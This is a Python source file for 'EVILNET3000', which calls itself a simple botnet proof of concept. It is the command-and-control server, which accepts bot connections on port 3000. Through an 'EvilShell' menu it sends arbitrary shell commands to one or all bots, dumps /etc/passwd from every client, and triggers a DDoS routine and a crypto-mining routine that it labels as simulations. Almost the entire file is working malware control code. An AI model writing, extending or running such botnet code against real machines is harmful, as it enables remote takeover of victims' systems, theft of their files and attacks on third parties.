import socket
import os
from _thread import *
from time import sleep
import signal

PORT = 3000
HOST = '0.0.0.0'  ## CHANGE THIS TO 127.0.0.1 FOR LOCALHOST TESTING
botnet_connections = list()
botnet_addresses = list()

class color:
    # defines the colors on the console, taken from blender:
    # https://svn.blender.org/svnroot/bf-blender/trunk/blender/build_files/scons/tools/bcolors.py
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def print_intro():
    print("")
    print(" ███████╗██╗   ██╗██╗██╗     ███╗   ██╗███████╗████████╗██████╗  ██████╗  ██████╗  ██████╗ ")
    print(" ██╔════╝██║   ██║██║██║     ████╗  ██║██╔════╝╚══██╔══╝╚════██╗██╔═████╗██╔═████╗██╔═████╗")
    print(" █████╗  ██║   ██║██║██║     ██╔██╗ ██║█████╗     ██║    █████╔╝██║██╔██║██║██╔██║██║██╔██║")
    print(" ██╔══╝  ╚██╗ ██╔╝██║██║     ██║╚██╗██║██╔══╝     ██║    ╚═══██╗████╔╝██║████╔╝██║████╔╝██║")
    print(" ███████╗ ╚████╔╝ ██║███████╗██║ ╚████║███████╗   ██║   ██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝")
    print(" ╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝  v.0.1")
    print(" ")
    print(" A simple botnet proof of concept built by Jorge Martinez | nothing4free")


def print_help():
    print(" ")
    print(" EVILNET3000: a simple botnet proof of concept built by Jorge Martinez | nothing4free")
    print("  > help: displays this menu.")
    print("  > info: displays version info.")
    print(" ")
    print(" System info and interaction:")
    print("  > getinfo: shows information about the bot's linux version.")
    print("  > run: allows the user to run a shell command on the bot.")
    print(" ")
    print(" Evil stuff:")
    print("  > ddostoolkit: simulates a DDoS attack (only pings the specified host 10 times).")
    print("  > getpasswd: dumps the content of /etc/passwd from every client.")
    print("  > minecrypto: simulates mining crypto. Now with 40% more NFTs!")
    print(" ")
    print(" Connection utilities:")
    print("  > connect: listens to and accepts incoming connections.")
    print("  > listcon: lists all active connections (UNDER DEV).")
    print("  > exit: closes all connections and exits the EvilShell.")
    print(" ")

def threaded_client(conn):
    botnet_connections.append(conn)


def listen_for_connections():
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Listening for incoming connections...")
    Client, address = s.accept()
    print(" [" + color.OKGREEN + "i" + color.ENDC + "] New connection: " + address[0] + ":" + str(address[1]))
    botnet_addresses.append(address[0])
    start_new_thread(threaded_client, (Client,))
    return


def close_connections():
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Shutting down the server")
    for conn in botnet_connections:
        conn.send(str.encode("!EXIT"))
        conn.close()


def select_connection():
    print(" What bot should the command be sent to?")
    i = 1
    for addr in botnet_addresses:
        print(" ", i, " > ", addr)
        i = i + 1
    print("Select connection (1 - " + str(i-1) + ") or 0 to select all: ")
    con = int(input())
    return con

def list_connections():
    i = 1
    for addr in botnet_addresses:
        print(" ", i, " > ", addr)
        i = i + 1

def print_info():
    print_intro()
    print(" ")
    print(" v.0.1: proof of concept beta.")
    print(" developed with <3 and a fuck ton of coffee.")
    print(" ")

# SCRIPT STARTS HERE ---------------------------------------------------------------------------------------------------

print_intro()

try:
    s = socket.socket()
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Socket created.")

    s.bind((HOST, PORT))
    print(" [" + color.OKBLUE + "i" + color.ENDC + "] Socket binded to port %s" % (PORT))

    print(" [" + color.OKGREEN + "i" + color.ENDC + "] Socket ready.")
    s.listen(5)

except:
    print(" [" + color.FAIL + "!" + color.ENDC + "] There was an error creating or binding the socket. Exiting...")
    exit(0)

while True:
    op = input(" [EvilShell] > ")

    if op == "connect":
        listen_for_connections()

    elif op == "ddostoolkit":
        connection = select_connection()
        if connection == 0:
            ddos_ip = input(" [DDoSToolkit] > IP / url: ")
            for conn in botnet_connections:
                conn.send(str.encode("ddostoolkit"))
                sleep(0.7)
                conn.send(str.encode(ddos_ip))
                conn.recv(1024)
        else:
            ddos_ip = input(" [DDoSToolkit] > IP / url: ")
            botnet_connections[connection - 1].send(str.encode("ddostoolkit"))
            sleep(0.7)
            botnet_connections[connection - 1].send(str.encode(ddos_ip))
            data = botnet_connections[connection - 1].recv(1024)
            print(data.decode("utf-8"))

    elif op == "getpasswd":
        connection = select_connection()
        if connection == 0:
            for conn in botnet_connections:
                conn.send(str.encode("getpasswd"))
                data = conn.recv(2048)
                print(data.decode("utf-8"))
                sleep(0.7)
        else:
            botnet_connections[connection - 1].send(str.encode("getpasswd"))
            data = botnet_connections[connection - 1].recv(2048)
            print(data.decode("utf-8"))
            sleep(0.7)

    elif op == "minecrypto":
        connection = select_connection()
        if connection == 0:
            for conn in botnet_connections:
                conn.send(str.encode("minecrypto"))
                sleep(0.7)
                data = conn.recv(2048)
                print(data.decode("utf-8"))
        else:
            botnet_connections[connection - 1].send(str.encode("minecrypto"))
            data = botnet_connections[connection - 1].recv(2048)
            print(data.decode("utf-8"))

    elif op == "getinfo":
        connection = select_connection()
        if connection == 0:
            print(" [" + color.FAIL + "!" + color.ENDC + "] Please select only 1 target.")
        else:
            botnet_connections[connection - 1].send(str.encode("getinfo"))
            sleep(0.7)
            data = botnet_connections[connection - 1].recv(2048)
            print(" " + data.decode("utf-8"))

    elif op == "run":
        command = input(" [run] > ")
        connection = select_connection()
        if connection == 0:
            for conn in botnet_connections:
                conn.send(str.encode("run"))
                sleep(0.7)
                conn.send(str.encode(command))
                data = conn.recv(2048)
                print(data.decode("utf-8"))
        else:
            botnet_connections[connection - 1].send(str.encode("run"))
            sleep(0.7)
            botnet_connections[connection - 1].send(str.encode(command))
            data = botnet_connections[connection - 1].recv(2048)
            print(data.decode("utf-8"))

    elif op == "lsconn":
        list_connections()

    elif op == "help":
        print_help()

    elif op == "info":
        print_info()

    elif op == "exit":
        close_connections()
        break
